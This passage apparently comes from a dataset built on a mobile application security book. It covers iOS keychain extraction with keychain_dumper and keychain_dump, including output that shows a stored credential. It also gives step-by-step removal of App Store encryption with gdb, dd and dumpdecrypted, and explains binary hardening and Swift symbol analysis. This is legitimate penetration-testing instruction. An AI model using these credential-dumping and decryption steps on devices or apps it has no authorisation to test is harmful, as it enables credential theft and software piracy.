wildcard\nkeychain-access-groups and querying the keychain service to retrieve the protected items. This is the technique\nused by the keychain_dumper tool (https://github.com/ptoomey3/Keychain-Dumper), which uses the “*” wildcard\nfor the keychain-access-groups value of the entitlements file. Here is a sample usage showing the items that\nkeychain_dumper can retrieve:\n# ./keychain_dumper -h\nUsage: keychain_dumper [-e]|[-h]|[-agnick]\n<no flags>: Dump Password Keychain Items (Generic Password, Internet\nPasswords)\n-a: Dump All Keychain Items (Generic Passwords, Internet Passwords,\nIdentities, Certificates, and Keys)\n-e: Dump Entitlements\n-g: Dump Generic Passwords\n-n: Dump Internet Passwords\n-i: Dump Identities\n-c: Dump Certificates\n-k: Dump Keys\nmdsecios:~ root#\nUsing keychain_dumper to access the generic passwords, keychain items can sometimes reveal application\ncredentials, as shown in the following example:\nGeneric Password\n----------------\nService:\nAccount: admin\nEntitlement Group: com.mdsec.mahhapp\nLabel:\nGeneric Field: mahhapp\nKeychain Data: secret\nBecause the keychain is simply a SQLite database, reading the encrypted data directly from the database and\nthen decrypting it using the AppleKeyStore service, which is exposed via the MobileKeyBag private framework, is\nalso possible. This is the approach taken by the keychain_dump tool developed by Jean-Baptiste Bedrune and\nJean Sigwald (https://code.google.com/p/iphone-dataprotection/source/browse/?repo=keychainviewe).\nSimply running the keychain_dump tool causes it to generate a number of plist files that provide a verbose\ndescription on each of the keychain items:\n# ./keychain_dump\nWriting 7 passwords to genp.plist\nWriting 0 internet passwords to inet.plist\nWriting 0 certificates to cert.plist\nWriting 4 keys to keys.plist\nUnderstanding Touch ID\nTouch ID is a fingerprint recognition feature that was introduced with the iPhone 5s; you access it by pressing\nthe home button on the device. The Touch ID sensor provides the user with an alternative means of\nauthentication to entering the device passcode and can be used to unlock the device, approve App Store and\niBooks purchases, and—as of iOS 8—be integrated as a means of authentication to third-party applications.\nThe Secure Enclave holds cryptographic material such as the data protection class keys. When a device is locked\nthe key material for the complete protection class is discarded, meaning that these items cannot be accessed\nuntil the user unlocks the device again. On a device with Touch ID enabled, however, the keys are not discarded\nbut held in memory, wrapped using a key that is available only to the Touch ID subsystem. When the user\nattempts to unlock the device using Touch ID, if the fingerprint is matched, the Touch ID subsystem provides\nthe key for unwrapping the complete data protection class and by proxy the device. Through this simplistic\nprocess, the Touch ID system is able to unlock the device and provide access to data-protected resources. Note,\nhowever, that the Touch ID system is not infallible and has indeed been proven to be breakable by an attacker\nwho is able to procure fingerprints and has physical access to the device\n(http://www.ccc.de/en/updates/2013/ccc-breaks-apple-touchid).\nEarlier in this chapter you learned how Touch ID authentication can be used with the keychain. However, using\nthe Touch ID sensor as a form of authentication using the LocalAuthentication framework is also possible.\nSome subtle differences exist in how these implementations work—primarily the trust relationship is between\nthe application and the OS as opposed to the Secure Enclave as is with the keychain; applications have no direct\naccess to the Secure Enclave or the registered fingerprints. If this was not the case it could give rise to a\nmalicious application extracting and exfiltrating device fingerprints, which would clearly be a huge security\nconcern.\nThe LocalAuthentication framework API implements two key methods relevant to Touch ID:\ncanEvaluatePolicy—You can use this method to determine whether the Touch ID can ever be evaluated on\nthis device; that is, is the device Touch ID enabled or not?\nevaluatePolicy—This method starts the authentication operation and shows the Touch ID interface.\nSimilarly to the keychain, a policy is available on which to base the authentication:\nLAPolicyDeviceOwnerAuthenticationWithBiometrics. This policy, however, has no passcode-based fallback\nauthentication mechanism, and you should implement your own within the application.\nThe following example demonstrates how you can implement Touch ID authentication using the\nLocalAuthentication framework:\nLAContext *myCxt = [[LAContext alloc] init];\nNSError * authErr = nil;\nNSString *myLocalizedReasonString = @\"Please Authenticate\";\nif ([myCxt canEvaluatePolicy:\nLAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authErr]) {\n[myCxt evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics\nlocalizedReason:myLocalizedReasonString reply:^(BOOL success, NSError\n*error) {\nif (success) {\nNSLog(@\"Fingerprint recognised\");\n} else {\nswitch (error.code) {\ncase LAErrorAuthenticationFailed:\nNSLog(@\"Fingerprint unrecognised\");\nbreak;\ncase LAErrorUserCancel:\nNSLog(@\"User cancelled authentication\");\nbreak;\ncase LAErrorUserFallback:\nNSLog(@\"User requested fallback authentication\");\nbreak;\ndefault:\nNSLog(@\"Touch ID is not enabled\");\nbreak;\n}\nNSLog(@\"Authentication failed\");\n}\n}];\n} else {\nNSLog(@\"Touch ID not enabled\");\n}\nYou should be aware that because the trust relationship is with the OS as opposed to the Secure Enclave (and as\nwith any client-side authentication), it can be bypassed in situations whereby an attacker has compromised the\ndevice.\nReverse Engineering iOS Binaries\nA blackbox assessment of any iOS application will almost certainly require some degree of reverse engineering\nto gain the necessary understanding of the inner workings of the application. In this section we review the\ndifferent types of iOS binaries that you may encounter, how to get these binaries into a format that you can\nwork with, and how to identify some security-relevant features in these binaries.\nAnalyzing iOS Binaries\nAs documented in earlier sections, iOS applications compile to native code using the Mach-O file format, similar\nto that used in the OS X operating system. Multiple Mach-O files can be archived in one binary to provide\nsupport for different architectures; these are known as fat binaries. Applications that are downloaded from the\nApp Store will also be encrypted and later decrypted at run time, on-device by the loader. A brief introduction to\nthe Mach-O file format appears in the following section. If, however, you prefer an in-depth analysis then we\nrecommend you refer to the file format reference as documented by Apple\n(https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/MachORuntime/Reference/reference.html\nAt a high-level the Mach-O file format is composed of three major regions (graphically illustrated in Figure 2.5):\nHeader—This is the first region of a Mach-O. It is used to identify the file format, and details the\narchitecture and other basic information that can be used to interpret the rest of the file.\nLoad commands—Directly following the header are a number of load commands that detail the layout and\nlinkage specifications for the file. The load commands specify, among other things, the location of the\nsymbol table, information on the encrypted segments of the file, names of shared libraries, and the initial\nlayout of the file in virtual memory.\nData—Following the load commands are one or more segments consisting of a number of sections; these\ncontain the code or data that subsequently gets mapped to virtual memory by the dynamic linker.\nFigure 2.5 The Mach-O file format\nFat binaries exist to provide support for many devices because the CPU can differ between iOS hardware.\nCurrently, the latest Apple CPU is the A8 Cyclone chip, which supports armv8, otherwise known as arm64\ninstructions. This chip is present only in the iPhone 6 and iPhone 6 Plus devices. An application compiled with\nonly arm64 support would therefore only work on these and A7 chip devices and as you can see from Table 2.4,\narchitecture support across devices can vary significantly. Without fat binaries an organization would need to\nsubmit device-specific releases of an application to the App Store. The architectures that you are most likely to\nencounter during your assessments are arm7, armv7s, and arm64; these provide support for the devices shown\nin Table 2.4.\nTable 2.4 Architecture Support in Modern iOS Devices\nARCHITECTURE IPHONE IPOD TOUCH IPAD IPAD MINI\nArmv7 3GS, 4, 4S, 5, 5C, 5S 3rd, 4th, 5th generation All versions All versions\nArmv7s 5, 5C, 5S No support 4th generation, Air 2nd generation\nArm64 5S, 6, 6 Plus No support Air 2nd generation\nTo identify the architectures compiled into a fat binary you can use otool to print the Mach-O header\ninformation, as shown here:\nmdsecmbp:mahhswiftapp.app shell$ otool -hv mahhswiftapp\nmahhswiftapp (architecture armv7):\nMach header\nmagic cputype cpusubtype caps filetype ncmds sizeofcmds\nflags\nMH_MAGIC ARM V7 0x00 EXECUTE 31 2908\nNOUNDEFS DYLDLINK TWOLEVEL BINDS_TO_WEAK PIE\nmahhswiftapp (architecture armv7s):\nMach header\nmagic cputype cpusubtype caps filetype ncmds sizeofcmds\nflags\nMH_MAGIC ARM V7S 0x00 EXECUTE 31 2908\nNOUNDEFS DYLDLINK TWOLEVEL BINDS_TO_WEAK PIE\nmahhswiftapp (architecture cputype (16777228) cpusubtype (0)):\nMach header\nmagic cputype cpusubtype caps filetype ncmds sizeofcmds\nflags\nMH_MAGIC_64 16777228 0 0x00 EXECUTE 31 3376\nNOUNDEFS DYLDLINK TWOLEVEL BINDS_TO_WEAK PIE\nmdsecmbp:mahhswiftapp.app shell$\nIn this example, the mahhswitftapp binary archive contains three architectures: armv7, armv7s, and arm64. On\noccasion, otool is unable to determine the architecture correctly, as in the previous example where it doesn’t\nexplicitly display the arm64 CPU type. You can use Table 2.5 as a point of reference to identify unknown\narchitectures.\nTable 2.5 ARM Architectures\nARCHITECTURE CPU TYPE CPU SUBTYPE\nARMv6 12 6\nARMv7 12 9\nARMv7S 12 11\nARM64 16777228 0\nYou may find that you need to remove one or more architectures from a binary. For example, many of the\ncurrent tools for manipulating and attacking iOS applications lack arm64 support because it’s a relatively new\nintroduction to the iOS device family. You can, however, remove whole architectures from a fat binary using\nlipo. The following example extracts the armv7 architecture from the previous archive and saves it in a new\nbinary:\n$ lipo -thin armv7 mahhswiftapp -output mahhswiftappv7\nIf you print the header output on the newly created binary, you can see it only contains the armv7 slice:\n$ otool -hv mahhswiftappv7\nmahhswiftappv7:\nMach header\nmagic cputype cpusubtype caps filetype ncmds sizeofcmds\nflags\nMH_MAGIC ARM V7 0x00 EXECUTE 31 2908\nNOUNDEFS DYLDLINK TWOLEVEL BINDS_TO_WEAK PIE\n$\nIdentifying Security-Related Features\nEarlier in this chapter we described some of the platform security features that exist in the iOS operating\nsystem. However, a number of other security configurations exist that applications can optionally take\nadvantage of to further increase their built-in protection against memory corruption vulnerabilities, as detailed\nin the following sections.\nPosition-Independent Executable\nPosition-Independent Executable (PIE) is an exploit mitigation security feature that allows an application to\ntake full advantage of ASLR. For this to happen, the application must be compiled using the —fPIC —pie flag;\nusing XCode this can be enabled/disabled by setting the value of the Generate Position-Dependent Code option\nfrom the Compiler Code Generation Build setting. An application compiled without PIE loads the executable at a\nfixed address. Consider the following simple example that prints the address of the main function:\nint main(int argc, const char* argv[])\n{\nNSLog(@\"Main: %p\\n\", main);\nreturn 0;\n}\nIf you compile this without PIE and run it on an iOS device, despite systemwide ASLR, the main executable\nremains loaded at a fixed address:\n# for i in 'seq 1 5'; do ./nopie-main;done\n2014-03-01 16:56:17.772 nopie-main[8943:707] Main: 0x2f3d\n2014-03-01 16:56:17.805 nopie-main[8944:707] Main: 0x2f3d\n2014-03-01 16:56:17.837 nopie-main[8945:707] Main: 0x2f3d\n2014-03-01 16:56:17.870 nopie-main[8946:707] Main: 0x2f3d\n2014-03-01 16:56:17.905 nopie-main[8947:707] Main: 0x2f3d\nIf you recompile the same application with PIE enabled, the application loads the main executable at a dynamic\naddress:\n# for i in 'seq 1 5'; do ./pie-main;done\n2014-03-01 16:57:32.175 pie-main[8949:707] Main: 0x2af39\n2014-03-01 16:57:32.208 pie-main[8950:707] Main: 0x3bf39\n2014-03-01 16:57:32.241 pie-main[8951:707] Main: 0x3f39\n2014-03-01 16:57:32.277 pie-main[8952:707] Main: 0x8cf39\n2014-03-01 16:57:32.310 pie-main[8953:707] Main: 0x30f39\nFrom a blackbox perspective, you can verify the presence of PIE using the otool application, which provides\nfunctionality to inspect the Mach-O header as shown in earlier examples. For the two test applications, you can\nuse otool to compare the headers of the two binaries and the output:\n# otool -hv pie-main nopie-main\npie-main:\nMach header\nmagic cputype cpusubtype caps filetype ncmds sizeofcmds\nflags\nMH_MAGIC ARM 9 0x00 EXECUTE 18 1948\nNOUNDEFS DYLDLINK TWOLEVEL PIE\nnopie-main:\nMach header\nmagic cputype cpusubtype caps filetype ncmds sizeofcmds\nflags\nMH_MAGIC ARM 9 0x00 EXECUTE 18 1948\nNOUNDEFS DYLDLINK TWOLEVEL\nSince iOS 5, all the built-in Apple applications are compiled with PIE by default; however, in practice many\nthird-party applications do not take advantage of this protection feature.\nStack-Smashing Protection\nA further binary protection that iOS application can apply at compile time is stack-smashing protection.\nEnabling stack-smashing protection causes a known value or “canary” to be placed on the stack directly before\nthe local variables to protect the saved base pointer, saved instruction pointer, and function arguments. The\nvalue of the canary is then verified when the function returns to see whether it has been overwritten. The LLVM\ncompiler uses a heuristic to intelligently apply stack protection to a function, typically functions using character\narrays. Stack-smashing protection is enabled by default for applications compiled with recent versions of Xcode.\nFrom a black box perspective you can identify the presence of stack canaries by examining the symbol table of\nthe binary. If stack-smashing protection is compiled into the application, two undefined symbols will be present:\n___stack_chk_fail and ___stack_chk_guard. You can observe the symbol table using otool:\n$ otool -I -v simpleapp | grep stack\n0x00001e48 97 ___stack_chk_fail\n0x00003008 98 ___stack_chk_guard\n0x0000302c 97 ___stack_chk_fail\n$\nAutomatic Reference Counting\nAutomatic Reference Counting (ARC) was introduced in iOS SDK version 5.0 to move the responsibility of\nmemory management and reference counting from the developer to the compiler. As a side effect ARC also\noffers some security benefits because it reduces the likelihood of developers’ introducing memory corruption\n(specifically, object use-after-free and double-free) vulnerabilities into applications.\nARC can be enabled globally within an Objective-C application within Xcode by setting the compiler option\nObjective-C Automatic Reference Counting to Yes. ARC can also be enabled or disabled on a per-object file basis\nusing the —fobjc-arc or —fno-objc-arc compiler flags. Swift applications require ARC, a setting enabled by\ndefault when you create a Swift application project in Xcode.\nTo identify the presence of ARC in a blackbox review of a compiled application, you can look for the presence of\nARC-related symbols in the symbol table, as shown here:\n$ otool -I -v test-swift | grep release\n0x0000ffa4 551 _objc_autoreleaseReturnValue\n0x0000ffcc 562 _objc_release\nA number of runtime support functions exist for ARC; however, some common ones that you are likely to\nobserve are:\nobjc_retainAutoreleaseReturnValue\nobjc_autoreleaseReturnValue\nobjc_storeStrong\nobjc_retain\nobjc_release\nobjc_retainAutoreleasedReturnValue\nBe aware that because ARC can be applied on a per-object file basis, identifying the presence of these symbols\ndoes not necessarily guarantee that ARC is used globally across all application classes. For more information on\nthe ARC run time, consult the LLVM documentation\nhttp://clang.llvm.org/docs/AutomaticReferenceCounting.html#runtime-support.\n2.8.3 Decrypting App Store Binaries\nWhen an application is released to the App Store, Apple applies its FairPlay Digital Rights Management (DRM)\ncopy scheme to protect the application against piracy. The result of this is an encrypted application where the\ninternal code structures are not immediately visible to someone attempting to reverse the application. In this\nsection you learn how to bypass this protection, providing a platform for you to go on and reverse engineer the\napplication.\nDecrypting iOS Binaries Using a Debugger\nApplications originating from the App Store are protected by Apple’s binary encryption scheme. These apps are\ndecrypted at run time by the kernel’s Mach-O loader; as such recovering the decrypted files is a relatively\nstraightforward process. Removing this encryption allows the attacker to get a greater understanding of how the\nbinary works, the internal class structure, and how to get the binary in a suitable state for reverse engineering.\nYou can remove the App Store encryption by letting the loader decrypt the application, then using lldb or gdb\nattach to the process and dump the cleartext application from memory.\nYou can identify encrypted binaries by the value in the cryptid field of the LC_ENCRYPTION_INFO load command.\nWe will now walk you through an example of decrypting the ProgCalc calculator application\n(https://itunes.apple.com/gb/app/progcalc-rpn-programmer-calculator/id294256032?mt=8):\n# otool -l ProgCalc | grep -A 4 LC_ENCRYPTION_INFO\ncmd LC_ENCRYPTION_INFO\ncmdsize 20\ncryptoff 4096\ncryptsize 53248\ncryptid 0\n1. To retrieve the decrypted segment of the ProgCalc application, you must first let the loader run and perform\nits decryption routines, and then attach to the application. You can do this by running the application on the\ndevice and using the attach command in gdb:\n(gdb) attach 963\nAttaching to process 963.\nReading symbols for shared libraries . done\nReading symbols for shared libraries\n...........................................................\n...........................................................\n..................................................... done\nReading symbols for shared libraries + done\n0x3ac22a58 in mach_msg_trap ()\n(gdb)\nAt this stage, the loader has decrypted the application and you can dump the cleartext segments directly from\nmemory. The location of the encrypted segment is specified by the cryptoff value in the LC_ENCRYPTION_INFO\nload command, which gives the offset relative to the header. You will need to take this value and add it to the\nbase address of the application.\n2. To find the base address you can use the following command:\n(gdb) info sharedlibrary\nThe DYLD shared library state has not yet been initialized.\nRequested State Current State\nNum Basename Type Address Reason | | Source\n| | | | | | | |\n1 ProgCalc - 0x1000 exec Y Y\n/private/var/mobile/Applications/659087B4-510A-475D-A50F-\nF4476464DB79/ProgCalc.app/ProgCalc (offset 0x0)\nIn this example, the ProgCalc image is loaded at a base address of 0x1000. Consequently, the encrypted\nsegment begins at offset 0x2000 or 8192 decimal (base address of 0x1000 plus the cryptoff of 0x1000). The\naddress range to extract from memory is simply the address of the start of the encrypted segment, plus the\nsize of the encrypted segment that is specified by the cryptsize variable (53248 or 0xD000 hex), resulting in\nan end address of 0xF000 (0x2000 + 0xD000).\n3. You can retrieve the decrypted segment using the dump memory GDB command:\n(gdb) dump memory ProgCalc.decrypted 8192 61440\n(gdb)\nThe resultant file should be exactly the same size as your cryptsize value.\n4. The decrypted section can then be written to the original binary, replacing the original encrypted segment:\n# dd seek=4096 bs=1 conv=notrunc if=ProgCalc.decrypted of=ProgCalc\n53248+0 records in\n53248+0 records out\n53248 bytes (53 kB) copied, 1.05688 s, 50.4 kB/s\nFinally, the cryptid value must be set to 0 to denote that the file is no longer encrypted and the loader\nshould not attempt to decrypt it. Using a hex editor such as vbindiff (available in saurik’s Cydia repository),\nyou must search for the location of the LC_ENCRYPTION_INFO command; find it by searching for the hex bytes\n2100000014000000. From this location, flip the cryptid value to 0, which is located 16 bytes in advance of\nthe cmdsize (0x21000000). At this stage your binary should be decrypted, and you can view the internal class\nstructure, which is covered in greater detail in the following section of this chapter.\nAutomating the Decryption Process\nManually decrypting an application as described in the previous section can be quite a laborious and potentially\nerror-prone task. This is why a number of researchers have developed tools to automate this process; some\ncommon examples include Clutch and the now defunct Crackulous application. However, our solution of choice\nis the dumpdecrypted tool developed by Stefan Esser (https://github.com/stefanesser/dumpdecrypted). This\nsolution works by using the dynamic linker to inject a constructor into the application, which goes on to\nautomatically parse the LC_ENCRYPTION_INFO load command and extract the decrypted segment in a similar way\nto the method described in the previous section.\nTo use dumpdecrypted simply run the application and use the DYLD_INSERT_LIBRARIES environment variable to\ninject the dumpdecrypted dynamic library, as shown here:\n# DYLD_INSERT_LIBRARIES=dumpdecrypted.dylib\n/var/mobile/Applications/C817EEF7-D01F-4E70-BE17-\n07C28B8D28E5/ProgCalc.app/ProgCalc\nmach-o decryption dumper\nDISCLAIMER: This tool is only meant for security research purposes,\nnot for application crackers.\n[+] offset to cryptid found: @0x1680(from 0x1000) = 680\n[+] Found encrypted data at address 00001000 of length 53248 bytes - type\n1.\n[+] Opening /private/var/mobile/Applications/C817EEF7-D01F-4E70-BE17-\n07C28B8D28E5/ProgCalc.app/ProgCalc for reading.\n[+] Reading header\n[+] Detecting header type\n[+] Executable is a plain MACH-O image\n[+] Opening ProgCalc.decrypted for writing.\n[+] Copying the not encrypted start of the file\n[+] Dumping the decrypted data into the file\n[+] Copying the not encrypted remainder of the file\n[+] Setting the LC_ENCRYPTION_INFO->cryptid to 0 at offset 680\n[+] Closing original file\n[+] Closing dump file\nThe tool generates a decrypted copy in the current working directory. You can verify that the application has\nbeen decrypted by checking the value of the cryptid variable, which should now be set to 0:\n# otool -l ProgCalc.decrypted | grep -A 4 LC_ENCRYPT\ncmd LC_ENCRYPTION_INFO\ncmdsize 20\ncryptoff 4096\ncryptsize 53248\ncryptid 0\nInspecting Decrypted Binaries\nNow that you are comfortable with the methods for decrypting iOS applications, we now detail how to use the\ndecrypted application to discover more about its inner workings.\nInspecting Objective-C Applications\nWithin a decrypted Objective-C binary, a wealth of information exists in the __OBJC segment that can be useful\nto a reverse engineer. The __OBJC segment provides details on the internal classes, methods, and variables used\nin the application; this information is particularly useful for understanding how the application functions, when\npatching it or hooking its methods at run time.\nYou can parse the __OBJC segment using the class-dump-z\n(https://code.google.com/p/networkpx/wiki/class_dump_z) application. For example, running the previously\ndecrypted ProgCalc application through class-dump-z yields details on the internal class structure, including the\nfollowing:\n@interface RootViewController :\n{\nProgCalcViewController *progcalcViewController;\nProgCalcDriver *driver;\nAboutViewController *aboutViewController;\nEditTableViewController *editTableViewController;\nUIBarButtonItem *doneButton;\nUIBarButtonItem *upgradeButton;\nUIBarButtonItem *saveButton;\n}\n- (void)dealloc;\n- (void)loadView;\n- (void)viewDidLoad;\n- (void)loadAboutViewController;\n- (void)upgrade;\n- (void)toggleAbout;\n- (void)loadEditViewController;\n- (void)toggleEdit;\n- (void)writeState;\n- (BOOL)shouldAutorotateToInterfaceOrientation:(int)fp8;\n- (void)didReceiveMemoryWarning;\n- (id)driver;\n- (void)setDriver:(id)fp8;\n- (id)editTableViewController;\n- (void)setEditTableViewController:(id)fp8;\n- (id)aboutViewController;\n- (void)setAboutViewController:(id)fp8;\n- (id)progcalcViewController;\n- (void)setProgcalcViewController:(id)fp8;\n@end\nIn the previous snippet class-dump-z identifies a number of methods in the RootViewController class, which\ngives you a fantastic insight into the application’s internals. In Chapter 3 you learn how by using this\ninformation you can invoke, modify, and tamper with these methods at run time.\nInspecting Swift Applications\nAs has been previously mentioned, Apple announced the release of Swift, a new programming language for use\nalongside iOS 8. At the time of writing iOS 8 is still in beta and little research has been released on the format or\nstructure of Swift binaries, nor are many tools available to parse them in a similar way to Objective-C\napplications. At the 2014 World Wide Developer Conference Apple suggested that the Swift language and syntax\nmight change in the future; the information presented within this section is accurate at the time of writing but\ncould potentially be affected by future changes to the language.\nUnlike Objective-C applications, Swift not only uses the traditional message passing system; this is only used for\nSwift classes that inherit from Objective-C classes. Swift classes use a mixture of two approaches: direct\nfunction calls and vtables. Where the compiler does not necessarily have enough information to form a direct\nfunction call or inline the function, Swift classes use vtables to handle dynamic dispatch; those of you familiar\nwith C++ may be aware of this approach. In this instance, the vtable acts as an array of function pointers. The\nvtable is constructed during compilation and the function’s pointers are inserted into the vtable array in the\norder that they are declared. The compiler converts any method calls into a vtable lookup by index during the\ncompilation process. This has some side effects: the most obvious being the impact on method swizzling, which\nChapter 3 covers.\nConsider the following simple Swift class:\nclass MAHH {\nfunc sayHello(personName: String) -> String {\nreturn \"Hello \" + personName + \"!\"\n}\nfunc helloMAHH()\n{\nprintln(sayHello(\"MAHH reader\"))\n}\n}\nIf you compile this class in a Swift application and use the latest version of class-dump to parse it (taken from\nswift-binaries branch of https://github.com/0xced/class-dump/tree/swift-binaries), you will see that the\nMAHH Swift class is actually an Objective-C object and has a superclass of SwiftObject, which is a new root class\nintroduced with the Swift run time:\n__attribute__((visibility(\"hidden\")))\n@interface MAHH : SwiftObject\n{\n}\n@end\nYou can then modify your Swift class to subclass an Objective-C class, in this case NSObject, by making the\nfollowing alteration,\nclass MAHH : NSObject {\nthen rerunning the class-dump of the application will produce a more familiar result, and in this instance you\ncan see the class methods:\n__attribute__((visibility(\"hidden\")))\n@interface MAHH : NSObject\n{\n}\n- (id)init;\n- (void)helloMAHH;\n- (id)sayHello:(id)arg1;\n@end\nAs you can see Swift is adaptable and may use different approaches for dynamic dispatch depending upon the\nuse case. But what about the methods for Swift classes that do not inherit from Objective-C? If you compile the\nfirst example again as a debug build, you can inspect the symbol table of the application using nm to find the\nfollowing:\n$ nm mahh-swift | grep -i mahh\n0000b710 T __TFC10mahh_swift4MAHH8sayHellofS0_FSSSS\n0000b824 T __TFC10mahh_swift4MAHH9helloMAHHfS0_FT_T_\nSwift uses C++–like name-mangled functions for methods. The naming convention for the function carries\nmetadata about the function, attributes, and more. Using the helloMAHH function from the earlier example, the\nmangled name can be broken down as follows:\n__TFC10mahh_swift4MAHH9helloMAHHfS0_FT_T_\n_T is the prefix indicating that it is a Swift symbol.\nF indicates that it is a function.\nC indicates that it is a function belonging to a class.\n10mahh_swift is the module name prefixed with a length.\n4MAHH is the class name prefixed with a length.\n9helloMAHH is the function name prefixed with a length.\nf is the function attribute; in this case, it indicates it’s a normal function.\nS0_FT is currently not publicly documented.\n_ separates the argument types from the return type; because this function takes no arguments, it comes\ndirectly after the S0_FT.\nT_ is the return type; in this case it specifies a void return. If S is used it specifies a Swift built-in type.\nYou can find a number of other values for this metadata detailed in http://www.eswick.com/2014/06/inside-\nswift/; some possible values for function attributes and Swift built-in types are listed in Table 2.6 and Table 2.7.\nTable 2.6 Function Attributes\nCHARACTER TYPE\nf Normal Function\ns Setter\ng Getter\nd Destructor\nD Deallocator\nc Constructor\nC Allocator\nTable 2.7 Swift Built-in Types\nCHARACTER TYPE\na Array\nb Boolean\nc UnicodeScalar\nd Double\nf Float\ni Integer\nu Unsigned Integer\nQ ImplicitlyUnwrappedOptional\nS String\nXcode also ships with the swift-demangle tool, which you can use to demangle a mangled symbol:\n$ swift-demangle -expand __TFC10mahh_swift4MAHH9helloMAHHfS0_FT_T_\nDemangling for _TFC10mahh_swift4MAHH9helloMAHHfS0_FT_T_\nkind=Global\nkind=Function\nkind=Class\nkind=Module, text=\"mahh_swift\"\nkind=Identifier, text=\"MAHH\"\nkind=Identifier, text=\"helloMAHH\"\nkind=Type\nkind=UncurriedFunctionType\nkind=Class\nkind=Module, text=\"mahh_swift\"\nkind=Identifier, text=\"MAHH\"\nkind=ReturnType\nkind=Type\nkind=FunctionType\nkind=ArgumentTuple\nkind=Type\nkind=NonVariadicTuple\nkind=ReturnType\nkind=Type\nkind=NonVariadicTuple\n_TFC10mahh_swift4MAHH9helloMAHHfS0_FT_T_ —>\nmahh_swift.MAHH.helloMAHH (mahh_swift.MAHH)() -> ()\nRelease builds are likely to be stripped, which will discard the name mangled symbols from the binary and make\nreverse engineering a much more time-consuming task.\n2.8.5 Disassembling and Decompiling iOS Applications\nAs you will now no doubt be aware, iOS applications compile to native code. This means that to reverse engineer\nthem, you must disassemble and decompile your target application. This level of in-depth reverse engineering is\nbeyond the scope of this book; indeed whole publications are dedicated to this topic alone. However, you should\nbe aware of a couple of tools that will help get you started in reverse engineering a native code application, both\nof which have excellent support for pseudo-code generation of ARM assembler:\nIDA Pro is the weapon of choice for many reverse engineers and is capable of parsing the Objective-C\nsegment to provide accurate class and method names. When armed with the Hex-Rays decompiler, IDA is\ncapable of giving a quite accurate pseudo-code representation of the target application.\nHopper is similar to IDA but has support for Linux and OS X. It has equivalent functionality for parsing and\naccurately renaming Objective-C functions as well as an excellent pseudo-code generator.\nFor further information on how to use Hopper and an introduction to static binary analysis, review the blog post\nby @0xabad1dea (http://abad1dea.tumblr.com/post/23487860422/analyzing-binaries-with-hoppers-\ndecompiler).\nSummary\nHaving studied this chapter you should now have a good understanding of how iOS applications work and are\ndistributed. You should also have familiarity with the iOS security model, including the many security features\nthat come with the platform. This will allow you to apply context to any vulnerabilities that you find when\nassessing an app.\nFurthermore, this chapter provided you with the necessary background information so that you may build your\nown test environment, using your own device. Armed with this knowledge, you will be able to install\napplications to begin exploring and start to spot basic vulnerabilities.\nThis chapter also introduced how iOS applications operate at a binary level, including the various compiled\nbased defenses that can be applied to applications, as well as how the Mach-O file format itself is structured.\nYou were also introduced to the App Store encryption mechanism and how to remove it from a production\nbinary, allowing you to obtain the internal class and method definitions from the app.\nIn summary this chapter has given you the foundation knowledge required to start practically looking at iOS\napplications and is essential stepping-stone to attacking them, a skill you will now learn in Chapter 3.",
    "question": "What are the different protection classes available for keychain items in iOS and how do they affect the accessibility and migration of these items?",
    "summary": "The iOS Keychain is an encrypted container for storing sensitive data with different protection levels that determine when the data can be accessed. Applications can add or update keychain items using specific methods and attributes, and keychain access is controlled by entitlements to prevent unauthorized access. iOS 8 introduced new authentication policies that require user authentication via passcode or Touch ID before accessing keychain items, enhancing security."
  },
  {
    "start": 16,
    "end": 22,
    "text": "CHAPTER 3\nAttacking iOS Applications\nIn Chapter 2 you learned a great deal about iOS applications, how they function, how they are distributed, and\nhow they are built. This knowledge provides a foundation with which to explore this chapter, which focuses on\nthe following scenarios for attacking iOS applications:\nAttacking from the network, including using tainted data originating from server-side applications\nAttacking an application with physical access to the device\nAttacking an application with interactive access to a device, including from the perspective of another\napplication on the device\nWhen conducting an assessment of any mobile application, consider these three attack surfaces so you can\nmake informed decisions when identifying and exploiting different attack vectors.\nIntroduction to Transport Security\nAlmost all mobile applications have to perform network communication. The ability to transmit and receive data\nenables applications to offer more than static apps offer. For example, they allow data to be continually updated\nand enable users to interact with server-side components and with each other to provide a feature-rich\nexperience. However, due to the nature of mobile devices this communication may often occur over untrusted\nor insecure networks such as hotel or café Wi-Fi, mobile hotspots, or cellular data connections. Consequently,\nperforming communications in a secure manner is imperative. This section walks through the types of\nvulnerabilities that can affect transport security, how to identify them in iOS applications, and where necessary,\nhow to bypass protective measures to allow traffic interception to be carried out for the purposes of security\nanalysis.\nIdentifying Transport Insecurities\nAny time an application makes a network request, you should protect the communication channel to guard\nagainst eavesdropping or tampering, regardless of whether the data being sent and received is sensitive. A\ncommon misconception is that applications need to encrypt only sensitive transactions such as authentication.\nAny data transfer or actions that take place over a cleartext channel, such as an HTTP request to a web\napplication, are susceptible to modification, and this could have differing consequences depending on how the\nrequest is implemented. For example, consider an application that uses a UIWebView to make a simple request to\na web application, transferring no sensitive data. An attacker in a position to perform a man-in-the-middle\nattack against this communication is able to inject JavaScript to perform a cross-site scripting attack. The\nconsequences can vary depending on how the UIWebView is configured and range from something as simple as\nmodifying the user interface, to stealing content from the filesystem; these types of attacks are detailed later in\nthis chapter in the section, “Injecting into UIWebViews.”\nTo identify when applications are making cleartext requests, you can apply the traditional methodology used for\nweb or thick-client applications. First, you may want to consider passively monitoring the traffic from the device\nusing a packet-capturing tool such as Wireshark (https://www.wireshark.org/). Alternatively, you may route\nyour device’s communications through a proxy such as Burp Suite (http://www.portswigger.net/). This method\nhelps identify HTTP-based traffic only. To avoid the risk of unencrypted eavesdropping, many applications\nemploy the Secure Socket Layer (SSL) or Transport Layer Security (TLS) to tunnel their communications.\nThe SSL protocol and its successor, the TLS protocol, are widely accepted as the de facto standard for secure\nnetwork communications on the Internet and elsewhere and are extensively used as a secure transport medium\nfor HTTP. Although you may on occasion find applications that use a third-party or custom implementation for\nSSL or TLS (such as OpenSSL or PolarSSL), the majority of applications on iOS use one of the APIs Apple\nprovides. Apple provides three ways to implement SSL and TLS:\nThe URL loading system—This API contains a number of high-level helper classes and methods such as\nNSURLConnection and NSURLSession that can be used to make secure HTTP requests. The URL loading system\nis perhaps the simplest method for making URL requests and for this reason is the most widely adopted.\nThe Carbon framework—This API is more granular than the URL loading system and gives developers a\ngreater level of control over network requests; it is typically implemented using the CFNetwork class.\nThe Secure Transport API—This low-level API is the foundation upon which the CFNetwork API and URL\nloading system are built. The API provides the 